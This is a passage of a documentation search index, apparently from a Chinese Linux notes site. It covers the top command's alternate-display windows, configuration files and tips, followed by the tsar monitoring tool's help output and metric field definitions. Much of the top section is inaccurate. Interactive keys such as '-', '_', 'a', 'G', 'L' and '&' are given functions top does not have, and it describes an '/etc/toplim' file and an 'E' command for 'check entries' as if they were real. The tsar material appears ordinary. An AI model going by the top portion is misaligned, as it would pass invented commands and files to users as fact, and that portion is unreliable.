\u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\uff0ctop\u63d0\u4f9b\u4e86\u989d\u5916\u7684\u7a97\u53e3\uff0c\u7528\u4e8e\u5c55\u793a\u4e0d\u540c\u7684\u4efb\u52a1\u548c\u7cfb\u7edf\u4fe1\u606f\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528`A`\u4ea4\u4e92\u547d\u4ee4\u5207\u6362\u5230\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u3002\u6bcf\u4e2a\u7a97\u53e3\u90fd\u53ef\u4ee5\u5355\u72ec\u914d\u7f6e\uff0c\u663e\u793a\u4e0d\u540c\u7684\u5b57\u6bb5\u548c\u6392\u5e8f\u987a\u5e8f\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u63d0\u4f9b\u56db\u4e2a\u7a97\u53e3\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528`g`\u4ea4\u4e92\u547d\u4ee4\u9009\u62e9\u8981\u67e5\u770b\u7684\u7a97\u53e3\u3002\u6bcf\u4e2a\u7a97\u53e3\u90fd\u6709\u81ea\u5df1\u7684\u5b57\u6bb5\u7ec4\u548c\u6392\u5e8f\u987a\u5e8f\uff0c\u5141\u8bb8\u4f60\u5b9a\u5236\u6bcf\u4e2a\u7a97\u53e3\u663e\u793a\u7684\u4fe1\u606f\u3002 5b. \u7a97\u53e3\u547d\u4ee4 \u4ee5\u4e0b\u547d\u4ee4\u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u53ef\u7528\uff0c\u7528\u4e8e\u7ba1\u7406\u7a97\u53e3\uff1a - : \u51cf\u5c0f\u7a97\u53e3\u5bbd\u5ea6 \u51cf\u5c0f\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 _ : \u51cf\u5c0f\u7a97\u53e3\u5bbd\u5ea6 \u51cf\u5c0f\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 = : \u91cd\u7f6e\u7a97\u53e3\u5927\u5c0f \u91cd\u7f6e\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 + : \u589e\u52a0\u7a97\u53e3\u5bbd\u5ea6 \u589e\u52a0\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 A : \u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u5207\u6362 \u5207\u6362\u5230\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u3002 a : \u7a97\u53e3\u6dfb\u52a0 \u6dfb\u52a0\u4e00\u4e2a\u65b0\u7a97\u53e3\u3002 g : \u9009\u62e9\u7a97\u53e3 \u9009\u62e9\u8981\u67e5\u770b\u7684\u7a97\u53e3\u3002 G : \u7a97\u53e3\u5220\u9664 \u5220\u9664\u5f53\u524d\u7a97\u53e3\u3002 w : \u5199\u5165\u914d\u7f6e\u6587\u4ef6 \u5c06\u5f53\u524d\u7a97\u53e3\u914d\u7f6e\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u3002 5c. \u7a97\u53e3\u6eda\u52a8 \u4ee5\u4e0b\u547d\u4ee4\u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u53ef\u7528\uff0c\u7528\u4e8e\u6eda\u52a8\u7a97\u53e3\u5185\u5bb9\uff1a C : \u5149\u6807\u63a7\u5236\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u542f\u7528\u6216\u7981\u7528\u5149\u6807\u63a7\u5236\u529f\u80fd\uff0c\u4ee5\u4fbf\u5728\u7a97\u53e3\u5185\u5bb9\u4e0a\u8fdb\u884c\u5bfc\u822a\u3002 Up : \u5411\u4e0a\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0a\u6eda\u52a8\u4e00\u884c\u3002 Dn : \u5411\u4e0b\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0b\u6eda\u52a8\u4e00\u884c\u3002 Left : \u5411\u5de6\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u5de6\u6eda\u52a8\u4e00\u5217\u3002 Right : \u5411\u53f3\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u53f3\u6eda\u52a8\u4e00\u5217\u3002 PgUp : \u5411\u4e0a\u7ffb\u9875 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0a\u6eda\u52a8\u4e00\u9875\u3002 PgDn : \u5411\u4e0b\u7ffb\u9875 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0b\u6eda\u52a8\u4e00\u9875\u3002 Home : \u8df3\u5230\u5f00\u5934 \u5c06\u7a97\u53e3\u5185\u5bb9\u8df3\u5230\u5f00\u5934\u3002 End : \u8df3\u5230\u7ed3\u5c3e \u5c06\u7a97\u53e3\u5185\u5bb9\u8df3\u5230\u7ed3\u5c3e\u3002 5d. \u7a97\u53e3\u641c\u7d22 \u4ee5\u4e0b\u547d\u4ee4\u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u53ef\u7528\uff0c\u7528\u4e8e\u5728\u7a97\u53e3\u5185\u5bb9\u4e2d\u641c\u7d22\uff1a L : \u5173\u952e\u5b57\u641c\u7d22 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u5173\u952e\u5b57\uff0c\u7528\u4e8e\u5728\u7a97\u53e3\u5185\u5bb9\u4e2d\u641c\u7d22\u5339\u914d\u9879\u3002 & : \u5b57\u6bb5\u8fc7\u6ee4 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u5b57\u6bb5\u540d\u548c\u4e00\u4e2a\u503c\uff0c\u4ee5\u4fbf\u4ec5\u663e\u793a\u5339\u914d\u8be5\u5b57\u6bb5\u503c\u7684\u4efb\u52a1\u3002 6. \u6587\u4ef6 6a. \u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6 top \u63d0\u4f9b\u4e86\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u6765\u4fdd\u5b58\u4f60\u5bf9 top \u754c\u9762\u548c\u884c\u4e3a\u7684\u6240\u6709\u81ea\u5b9a\u4e49\u8bbe\u7f6e\u3002\u914d\u7f6e\u6587\u4ef6\u901a\u5e38\u4f4d\u4e8e\u7528\u6237\u7684\u4e3b\u76ee\u5f55\u4e2d\uff0c\u540d\u4e3a `.toprc`\u3002 \u914d\u7f6e\u6587\u4ef6\u5305\u542b\u7684\u8bbe\u7f6e\u5305\u62ec\uff1a\u5b57\u6bb5\u548c\u6392\u5e8f\u3001\u6458\u8981\u533a\u57df\u8bbe\u7f6e\u3001\u5ef6\u8fdf\u65f6\u95f4\u3001\u989c\u8272\u6620\u5c04\u7b49\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7 `W` \u4ea4\u4e92\u547d\u4ee4\u5c06\u5f53\u524d\u914d\u7f6e\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u3002 6b. \u6dfb\u52a0\u68c0\u67e5\u6761\u76ee \u4f60\u53ef\u4ee5\u901a\u8fc7\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0\u68c0\u67e5\u6761\u76ee\u6765\u76d1\u63a7\u7279\u5b9a\u8fdb\u7a0b\u6216\u7cfb\u7edf\u72b6\u6001\u3002\u68c0\u67e5\u6761\u76ee\u5b9a\u4e49\u4e86\u6761\u4ef6\uff0c\u5f53\u8fd9\u4e9b\u6761\u4ef6\u6ee1\u8db3\u65f6\uff0ctop \u5c06\u53d1\u51fa\u8b66\u544a\u6216\u6267\u884c\u64cd\u4f5c\u3002 \u6bcf\u4e2a\u68c0\u67e5\u6761\u76ee\u5305\u542b\u4ee5\u4e0b\u5b57\u6bb5\uff1a - \u540d\u79f0 - \u6761\u4ef6\u8868\u8fbe\u5f0f - \u52a8\u4f5c - \u4f18\u5148\u7ea7 \u4f60\u53ef\u4ee5\u4f7f\u7528 `E` \u547d\u4ee4\u6dfb\u52a0\u65b0\u7684\u68c0\u67e5\u6761\u76ee\uff0c\u6216\u7f16\u8f91\u73b0\u6709\u7684\u68c0\u67e5\u6761\u76ee\u3002 6c. \u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6 \u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e `/etc/toprc`\uff0c\u7528\u4e8e\u5b9a\u4e49\u7cfb\u7edf\u8303\u56f4\u7684 top \u8bbe\u7f6e\u3002\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u7684\u8bed\u6cd5\u4e0e\u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6\u76f8\u540c\uff0c\u4f46\u4f18\u5148\u7ea7\u8f83\u4f4e\u3002 6d. \u7cfb\u7edf\u9650\u5236\u6587\u4ef6 \u7cfb\u7edf\u9650\u5236\u6587\u4ef6\u4f4d\u4e8e `/etc/toplim`\uff0c\u7528\u4e8e\u5b9a\u4e49\u5bf9 top \u64cd\u4f5c\u7684\u9650\u5236\u3002\u8fd9\u4e9b\u9650\u5236\u5305\u62ec\uff1a\u6700\u5927\u4efb\u52a1\u6570\u3001\u6700\u5927\u5b57\u6bb5\u6570\u3001\u6700\u5927\u5185\u5b58\u4f7f\u7528\u7b49\u3002 \u7cfb\u7edf\u9650\u5236\u6587\u4ef6\u4e2d\u7684\u8bbe\u7f6e\u5c06\u8986\u76d6\u7528\u6237\u7684\u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u8bbe\u7f6e\u3002 7. \u4e00\u4e9b\u5947\u5999\u7684\u6280\u5de7 7a. \u5185\u6838\u9b54\u672f \u4f60\u53ef\u4ee5\u4f7f\u7528 top \u7684\u4ea4\u4e92\u547d\u4ee4\u6765\u67e5\u770b\u548c\u64cd\u4f5c\u5185\u6838\u53c2\u6570\u3002\u4f8b\u5982\uff0c\u4f7f\u7528 `k` \u547d\u4ee4\u53ef\u4ee5\u6740\u6b7b\u4efb\u52a1\uff0c\u4f7f\u7528 `r` \u547d\u4ee4\u53ef\u4ee5\u8c03\u6574\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u3002 7b. \u7a97\u53e3\u5f39\u8df3 \u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 `a` \u547d\u4ee4\u6dfb\u52a0\u65b0\u7a97\u53e3\uff0c\u5e76\u901a\u8fc7 `g` \u547d\u4ee4\u5728\u7a97\u53e3\u4e4b\u95f4\u5207\u6362\u3002\u8fd9\u6837\u53ef\u4ee5\u540c\u65f6\u76d1\u63a7\u591a\u4e2a\u8fdb\u7a0b\u548c\u7cfb\u7edf\u72b6\u6001\u3002 7c. \u5927\u9e1f\u7a97\u53e3 \u4f7f\u7528 top \u7684\u989c\u8272\u6620\u5c04\u529f\u80fd\uff0c\u4f60\u53ef\u4ee5\u5c06\u91cd\u8981\u7684\u4efb\u52a1\u6216\u72b6\u6001\u7a81\u51fa\u663e\u793a\u4e3a\u4e0d\u540c\u7684\u989c\u8272\u3002\u8fd9\u6837\u53ef\u4ee5\u5728\u5927\u91cf\u4fe1\u606f\u4e2d\u5feb\u901f\u8bc6\u522b\u5173\u952e\u6570\u636e\u3002 7d. \u4ea4\u6362\u7a97\u53e3 \u4f7f\u7528 top \u7684\u7a97\u53e3\u529f\u80fd\uff0c\u4f60\u53ef\u4ee5\u521b\u5efa\u591a\u4e2a\u7a97\u53e3\uff0c\u5206\u522b\u663e\u793a\u4e0d\u540c\u7684\u4fe1\u606f\u3002\u7136\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 `G` \u547d\u4ee4\u5220\u9664\u4e0d\u9700\u8981\u7684\u7a97\u53e3\uff0c\u6216\u4f7f\u7528 `A` \u547d\u4ee4\u5207\u6362\u663e\u793a\u6a21\u5f0f\u3002 8. \u9519\u8bef \u5982\u679c\u4f60\u5728\u4f7f\u7528 top \u65f6\u9047\u5230\u4efb\u4f55\u95ee\u9898\uff0c\u8bf7\u53c2\u9605 top \u7684\u624b\u518c\u9875\u6216\u5728\u7ebf\u6587\u6863\u83b7\u53d6\u5e2e\u52a9\u3002 9. \u53c2\u89c1 \u6709\u5173 top \u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u4ee5\u4e0b\u8d44\u6e90\uff1a - man \u9875\uff1aman top - \u5728\u7ebf\u6587\u6863\uff1ahttps://man7.org/linux/man-pages/man1/top.1.html","title":"\u4ea4\u4e92\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/","text":"tsar\u547d\u4ee4 [root@VM-0-16-centos ~]# tsar -help Usage: tsar [options] Options: -check \u663e\u793a\u8b66\u62a5\u7684\u6700\u540e\u4e00\u6761\u8bb0\u5f55 --check/-C \u663e\u793a\u8b66\u62a5\u7684\u6700\u540e\u4e00\u6761\u8bb0\u5f55.\u4f8b\u5982:tsar --check / tsar --check --cpu --io --watch/-w \u4ee5N\u5206\u949f\u4e3a\u5355\u4f4d\u663e\u793a\u6700\u540e\u8bb0\u5f55\u3002 \u4f8b\u5982:tsar --watch 30 / tsar --watch 30 --cpu --io --cron/-c \u4ee5cron\u6a21\u5f0f\u8fd0\u884c\uff0c\u5c06\u6570\u636e\u8f93\u51fa\u5230\u6587\u4ef6 --interval/-i \u6307\u5b9a\u95f4\u9694\u6570\uff0c\u4ee5\u5206\u949f\u4e3a\u5355\u4f4d\uff0c\u5982\u679c\u4f7f\u7528--live\uff0c\u5219\u4ee5\u79d2\u4e3a\u5355\u4f4d --list/-L \u5217\u51fa\u542f\u7528\u7684\u6a21\u5757 --live/-l \u8fd0\u884c\u6253\u5370\u5b9e\u65f6\u6a21\u5f0f\uff0c\u54ea\u4e2a\u6a21\u5757\u5c06\u6253\u5370 --file/-f \u6307\u5b9a\u6587\u4ef6\u8def\u5f84\u4f5c\u4e3a\u8f93\u5165 --ndays/-n \u663e\u793a\u8fc7\u53bb\u51e0\u5929\u7684\u503c\uff08\u9ed8\u8ba4\u503c\uff1a1\uff09 --date/-d \u663e\u793a\u6307\u5b9a\u65e5\u671f\u7684\u503c\u6216\u8005\u51e0\u5929\u524d(n or YYYYMMDD) --merge/-m \u5c06\u591a\u9879\u5408\u5e76\u4e3a\u4e00 --detail/-D \u4e0d\u5c06\u6570\u636e\u8f6c\u6362\u4e3aK/M/G 1024\u8fdb\u5236 --spec/-s \u663e\u793a\u89c4\u8303\u5b57\u6bb5\u6570\u636e, tsar --cpu -s sys,util --item/-I \u663e\u793a\u89c4\u8303\u9879\u6570\u636e, tsar --io -I sda --help/-h \u5e2e\u52a9 Modules Enabled: --cpu CPU \u6570\u636e (user, system, interrupt, nice, & idle) --mem \u7269\u7406\u5185\u5b58\u3002share (active, inactive, cached, free, wired) --swap swap \u4f7f\u7528 --tcp TCP \u6d41\u91cf (v4) --udp UDP \u6d41\u91cf (v4) --traffic \u51c0\u6d41\u91cf\u7edf\u8ba1 --io Linux I/O performance --pcsw \u6d41\u7a0b\uff08\u4efb\u52a1\uff09\u521b\u5efa\u548c\u4e0a\u4e0b\u6587\u5207\u6362 --partition \u78c1\u76d8\u548c\u5206\u533a\u4f7f\u7528\u60c5\u51b5 --tcpx TCP connection data --load \u7cfb\u7edf\u8fd0\u884c\u961f\u5217\u548c\u5e73\u5747\u8d1f\u8f7d \u5b89\u88c5\u540e\uff0c\u60a8\u53ef\u80fd\u4f1a\u770b\u5230\u4ee5\u4e0b\u6587\u4ef6\uff1a /etc/tsar/tsar.conf \uff0c\u8fd9\u662ftsar\u7684\u4e3b\u914d\u7f6e\u6587\u4ef6; /etc/cron.d/tsar \uff0c\u7528\u4e8e\u8fd0\u884ctsar\u6bcf\u5206\u949f\u6536\u96c6\u4fe1\u606f; /etc/logrotate.d/tsar \u5c06\u6bcf\u6708\u8f6e\u6362tsar\u7684\u65e5\u5fd7\u6587\u4ef6; /usr/local/tsar/modules \u662f\u6240\u6709\u6a21\u5757\u5e93 \uff08*.so\uff09 \u6240\u5728\u7684\u76ee\u5f55; \u5e38\u7528\u547d\u4ee4 \u67e5\u770b\u7f51\u5361\u662f\u5426\u4e22\u5305 #tsar --live -i 1 --traffic Time ---------------------traffic-------------------- Time bytin bytout pktin pktout pkterr pktdrp 12/10/23-17:17:15 174.00 160.00 3.00 2.00 0.00 0.00 12/10/23-17:17:16 672.00 2.8K 8.00 9.00 0.00 0.00 12/10/23-17:17:17 968.00 2.5K 12.00 11.00 0.00 0.00 12/10/23-17:17:18 618.00 1.0K 7.00 7.00 0.00 0.00 12/10/23-17:17:19 66.00 182.00 1.00 1.00 0.00 0.00 12/10/23-17:17:20 150.00 278.00 3.00 3.00 0.00 0.00 12/10/23-17:17:21 1.9K 2.3K 16.00 14.00 0.00 0.00 12/10/23-17:17:22 1.9K 1.8K 13.00 13.00 0.00 0.00 12/10/23-17:17:23 2.1K 3.3K 14.00 13.00 0.00 0.00 12/10/23-17:17:24 984.00 1.4K 10.00 10.00 0.00 0.00 12/10/23-17:17:25 452.00 584.00 6.00 6.00 0.00 0.00 12/10/23-17:17:26 1.0K 1.9K 12.00 12.00 0.00 0.00 12/10/23-17:17:27 884.00 2.2K 10.00 10.00 0.00 0.00 \u663e\u793a\u8fc7\u53bb5\u5929\u6bcf\u4e00\u5206\u949f\u7684\u7f51\u7edc\u4fe1\u606f tsar -n 5 -i i --traffic cpu \u5b57\u6bb5\u542b\u4e49 user: \u8868\u793aCPU\u6267\u884c\u7528\u6237\u8fdb\u7a0b\u7684\u65f6\u95f4,\u901a\u5e38\u671f\u671b\u7528\u6237\u7a7a\u95f4CPU\u8d8a\u9ad8\u8d8a\u597d. sys: \u8868\u793aCPU\u5728\u5185\u6838\u8fd0\u884c\u65f6\u95f4,\u7cfb\u7edfCPU\u5360\u7528\u7387\u9ad8,\u8868\u660e\u7cfb\u7edf\u67d0\u90e8\u5206\u5b58\u5728\u74f6\u9888.\u901a\u5e38\u503c\u8d8a\u4f4e\u8d8a\u597d. wait: CPU\u5728\u7b49\u5f85I/O\u64cd\u4f5c\u5b8c\u6210\u6240\u82b1\u8d39\u7684\u65f6\u95f4.\u7cfb\u7edf\u4e0d\u5e94\u8be5\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\u6765\u7b49\u5f85I/O\u64cd\u4f5c,\u5426\u5219\u5c31\u8bf4\u660eI/O\u5b58\u5728\u74f6\u9888. hirq: \u7cfb\u7edf\u5904\u7406\u786c\u4e2d\u65ad\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u767e\u5206\u6bd4 sirq: \u7cfb\u7edf\u5904\u7406\u8f6f\u4e2d\u65ad\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u767e\u5206\u6bd4 util: CPU\u603b\u4f7f\u7528\u7684\u65f6\u95f4\u767e\u5206\u6bd4 nice: \u7cfb\u7edf\u8c03\u6574\u8fdb\u7a0b\u4f18\u5148\u7ea7\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u767e\u5206\u6bd4 steal: \u88ab\u5f3a\u5236\u7b49\u5f85\uff08involuntary wait\uff09\u865a\u62dfCPU\u7684\u65f6\u95f4,\u6b64\u65f6hypervisor\u5728\u4e3a\u53e6\u4e00\u4e2a\u865a\u62df\u5904\u7406\u5668\u670d\u52a1 ncpu: CPU\u7684\u603b\u4e2a\u6570 mem \u5b57\u6bb5\u542b\u4e49 free: \u7a7a\u95f2\u7684\u7269\u7406\u5185\u5b58\u7684\u5927\u5c0f used: \u5df2\u7ecf\u4f7f\u7528\u7684\u5185\u5b58\u5927\u5c0f buff: buff\u4f7f\u7528\u7684\u5185\u5b58\u5927\u5c0f,buffer is something that has yet to be \"written\" to disk. cach: \u64cd\u4f5c\u7cfb\u7edf\u4f1a\u628a\u7ecf\u5e38\u8bbf\u95ee\u7684\u4e1c\u897f\u653e\u5728cache\u4e2d\u52a0\u5feb\u6267\u884c\u901f\u5ea6,A cache is something that has been \"read\" from the disk and stored for later use total: \u7cfb\u7edf\u603b\u7684\u5185\u5b58\u5927\u5c0f util: \u5185\u5b58\u4f7f\u7528\u7387 load \u5b57\u6bb5\u542b\u4e49 load1: \u4e00\u5206\u949f\u7684\u7cfb\u7edf\u5e73\u5747\u8d1f\u8f7d load5: \u4e94\u5206\u949f\u7684\u7cfb\u7edf\u5e73\u5747\u8d1f\u8f7d load15:\u5341\u4e94\u5206\u949f\u7684\u7cfb\u7edf\u5e73\u5747\u8d1f\u8f7d runq: \u5728\u91c7\u6837\u65f6\u523b,\u8fd0\u884c\u961f\u5217\u7684\u4efb\u52a1\u7684\u6570\u76ee,\u4e0e/proc/stat\u7684procs_running\u8868\u793a\u76f8\u540c\u610f\u601d plit: \u5728\u91c7\u6837\u65f6\u523b,\u7cfb\u7edf\u4e2d\u6d3b\u8dc3\u7684\u4efb\u52a1\u7684\u4e2a\u6570\uff08\u4e0d\u5305\u62ec\u8fd0\u884c\u5df2\u7ecf\u7ed3\u675f\u7684\u4efb\u52a1\uff09 traffic \u5b57\u6bb5\u542b\u4e49 bytin: \u5165\u53e3\u6d41\u91cfbyte/s bytout: \u51fa\u53e3\u6d41\u91cfbyte/s pktin: \u5165\u53e3pkt/s pktout: \u51fa\u53e3pkt/s tcp \u5b57\u6bb5\u542b\u4e49 active:\u4e3b\u52a8\u6253\u5f00\u7684tcp\u8fde\u63a5\u6570\u76ee pasive:\u88ab\u52a8\u6253\u5f00\u7684tcp\u8fde\u63a5\u6570\u76ee iseg: \u6536\u5230\u7684tcp\u62a5\u6587\u6570\u76ee outseg:\u53d1\u51fa\u7684tcp\u62a5\u6587\u6570\u76ee EstRes:Number of resets that have occurred at ESTABLISHED AtmpFa:Number of failed connection attempts CurrEs:\u5f53\u524d\u72b6\u6001\u4e3aESTABLISHED\u7684tcp\u8fde\u63a5\u6570 retran:\u7cfb\u7edf\u7684\u91cd\u4f20\u7387 udp \u5b57\u6bb5\u542b\u4e49 idgm: \u6536\u5230\u7684udp\u62a5\u6587\u6570\u76ee odgm: \u53d1\u9001\u7684udp\u62a5\u6587\u6570\u76ee noport:udp\u534f\u8bae\u5c42\u63a5\u6536\u5230\u76ee\u7684\u5730\u5740\u6216\u76ee\u7684\u7aef\u53e3\u4e0d\u5b58\u5728\u7684\u6570\u636e\u5305 idmerr:udp\u5c42\u63a5\u6536\u5230\u7684\u65e0\u6548\u6570\u636e\u5305\u7684\u4e2a\u6570 tcpx \u5b57\u6bb5\u542b\u4e49 recvq : tcprecvq sendq : tcpsendq est : tcpest twait: tcptimewait fwait1 : tcpfinwait1 fwait2 : tcpfinwait2 lisq : tcplistenq lising : tcplistenincq lisove : tcplistenover cnest : tcpnconnest ndrop : tcpnconndrop edrop : tcpembdrop rdrop : tcprexmitdrop pdrop : tcppersistdrop kdrop : tcpkadrop paritition \u5b57\u6bb5\u542b\u4e49 bfree: \u5206\u533a\u7a7a\u95f2\u7684\u5b57\u8282 bused: \u5206\u533a\u4f7f\u7528\u4e2d\u7684\u5b57\u8282 btotl: \u5206\u533a\u603b\u7684\u5927\u5c0f util: \u5206\u533a\u4f7f\u7528\u7387 pcsw \u5b57\u6bb5\u542b\u4e49 cswch: \u8fdb\u7a0b\u5207\u6362\u6b21\u6570 proc: \u65b0\u5efa\u7684\u8fdb\u7a0b\u6570 proc \u5b57\u6bb5\u542b\u4e49 user: \u67d0\u4e2a\u8fdb\u7a0b\u7528\u6237\u6001cpu\u6d88\u8017 sys: \u67d0\u4e2a\u8fdb\u7a0b\u7cfb\u7edf\u6001cpu\u6d88\u8017 total:\u67d0\u4e2a\u8fdb\u7a0b\u603b\u7684cpu\u6d88\u8017 mem: \u67d0\u4e2a\u8fdb\u7a0b\u7684\u5185\u5b58\u6d88\u8017\u767e\u5206\u6bd4 RSS: \u67d0\u4e2a\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u6d88\u8017,\u8fd9\u662f\u9a7b\u7559\u5728\u7269\u7406\u5185\u5b58\u7684\u4e00\u90e8\u5206.\u5b83\u6ca1\u6709\u4ea4\u6362\u5230\u786c\u76d8.\u5b83\u5305\u62ec\u4ee3\u7801,\u6570\u636e\u548c\u6808 read: \u8fdb\u7a0bio\u8bfb\u5b57\u8282 write:\u8fdb\u7a0b\u7684io\u5199\u5b57\u8282 nginx \u5b57\u6bb5\u542b\u4e49 Accept:\u603b\u5171\u63a5\u6536\u7684\u65b0\u8fde\u63a5\u6570\u76ee Handle:\u603b\u5171\u5904\u7406\u7684\u8fde\u63a5\u6570\u76ee Reqs:\u603b\u5171\u4ea7\u751f\u8bf7\u6c42\u6570\u76ee Active:\u6d3b\u8dc3\u7684\u8fde\u63a5\u6570,\u7b49\u4e8eread+write+wait Read:\u8bfb\u53d6\u8bf7\u6c42\u6570\u636e\u7684\u8fde\u63a5\u6570\u76ee Write:\u5411\u7528\u6237\u5199\u54cd\u5e94\u6570\u636e\u7684\u8fde\u63a5\u6570\u76ee Wait:\u957f\u8fde\u63a5\u7b49\u5f85\u7684\u8fde\u63a5\u6570\u76ee Qps:\u6bcf\u79d2\u5904\u7406\u7684\u8bf7\u6c42\u6570 Rt:\u5e73\u5747\u54cd\u5e94\u65f6\u95f4ms squid \u5b57\u6bb5\u542b\u4e49 qps: \u6bcf\u79d2\u8bf7\u6c42\u6570 rt: \u8bbf\u95ee\u5e73\u5747\u76f8\u5e94\u65f6\u95f4 r_hit: \u8bf7\u6c42\u547d\u4e2d\u7387 b_hit: \u5b57\u8282\u547d\u4e2d\u7387 d_hit: \u78c1\u76d8\u547d\u4e2d\u7387 m_hit: \u5185\u5b58\u547d\u4e2d\u7387 fdused: Number of file desc currently in use fdque: Files queued for open objs: StoreEntries inmem: StoreEntries with MemObjects hot: Hot Object Cache Items size: Mean Object Size haproxy \u5b57\u6bb5\u542b\u4e49 stat: \u72b6\u6001,1\u6b63\u5e38 uptime:\u542f\u52a8\u6301\u7eed\u65f6\u95f4 conns: \u603b\u7684\u8fde\u63a5\u6570 qps: \u6bcf\u79d2\u8bf7\u6c42\u6570 hit: haproxy\u5f00\u542fcache\u65f6\u7684\u547d\u4e2d\u7387 rt: \u5e73\u5747\u54cd\u5e94\u65f6\u95f4ms lvs \u5b57\u6bb5\u542b\u4e49 stat: lvs\u72b6\u6001,1\u6b63\u5e38 conns: \u603b\u7684\u8fde\u63a5\u6570 pktin: \u6536\u5230\u7684\u5305\u6570 pktout:\u53d1\u51fa\u7684\u5305\u6570 bytin: \u6536\u5230\u7684\u5b57\u8282\u6570 bytout:\u53d1\u51fa\u7684\u5b57\u8282\u6570 \u76f8\u5173\u94fe\u63a5 \u80fd\u4e0d\u80fd\u5bf9mysql\u8868\u5185\u7684\u4e00\u4e9b\u5b57\u6bb5\u8fdb\u884c\u4e00\u4e0b\u6ce8\u91ca\u8bf4\u660e \u00b7 Issue #19 \u00b7 alibaba/tsar \u00b7 GitHub tsar\u4f7f\u7528\u8bf4\u660e - sidesky - \u535a\u5ba2\u56ed (cnblogs.com) GitHub - alibaba/tsar: Taobao System Activity Reporter \u5173\u4e8etraffic\u4e2d\u7684\u5355\u4f4d\u95ee\u9898\u3002 \u00b7 Issue #106 \u00b7 alibaba/tsar \u00b7 GitHub tsar\u547d\u4ee4 \u2013 \u6536\u96c6\u670d\u52a1\u5668\u7cfb\u7edf\u4fe1\u606f \u2013 Linux\u547d\u4ee4\u5927\u5168(\u624b\u518c) (linuxcool.com)","title":"tsar\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/tsar/#tsar","text":"[root@VM-0-16-centos ~]# tsar -help Usage: tsar [options] Options: -check \u663e\u793a\u8b66\u62a5\u7684\u6700\u540e\u4e00\u6761\u8bb0\u5f55 --check/-C \u663e\u793a\u8b66\u62a5\u7684\u6700\u540e\u4e00\u6761\u8bb0\u5f55.\u4f8b\u5982:tsar --check / tsar --check --cpu --io --watch/-w \u4ee5N\u5206\u949f\u4e3a\u5355\u4f4d\u663e\u793a\u6700\u540e\u8bb0\u5f55\u3002 \u4f8b\u5982:tsar --watch 30 / tsar --watch 30 --cpu --io --cron/-c \u4ee5cron\u6a21\u5f0f\u8fd0\u884c\uff0c\u5c06\u6570\u636e\u8f93\u51fa\u5230\u6587\u4ef6 --interval/-i \u6307\u5b9a\u95f4\u9694\u6570\uff0c\u4ee5\u5206\u949f\u4e3a\u5355\u4f4d\uff0c\u5982\u679c\u4f7f\u7528--live\uff0c\u5219\u4ee5\u79d2\u4e3a\u5355\u4f4d --list/-L \u5217\u51fa\u542f\u7528\u7684\u6a21\u5757 --live/-l \u8fd0\u884c\u6253\u5370\u5b9e\u65f6\u6a21\u5f0f\uff0c\u54ea\u4e2a\u6a21\u5757\u5c06\u6253\u5370 --file/-f \u6307\u5b9a\u6587\u4ef6\u8def\u5f84\u4f5c\u4e3a\u8f93\u5165 --ndays/-n \u663e\u793a\u8fc7\u53bb\u51e0\u5929\u7684\u503c\uff08\u9ed8\u8ba4\u503c\uff1a1\uff09 --date/-d \u663e\u793a\u6307\u5b9a\u65e5\u671f\u7684\u503c\u6216\u8005\u51e0\u5929\u524d(n or YYYYMMDD) --merge/-m \u5c06\u591a\u9879\u5408\u5e76\u4e3a\u4e00 --detail/-D \u4e0d\u5c06\u6570\u636e\u8f6c\u6362\u4e3aK/M/G 1024\u8fdb\u5236 --spec/-s \u663e\u793a\u89c4\u8303\u5b57\u6bb5\u6570\u636e, tsar --cpu -s sys,util --item/-I \u663e\u793a\u89c4\u8303\u9879\u6570\u636e, tsar --io -I sda --help/-h \u5e2e\u52a9 Modules 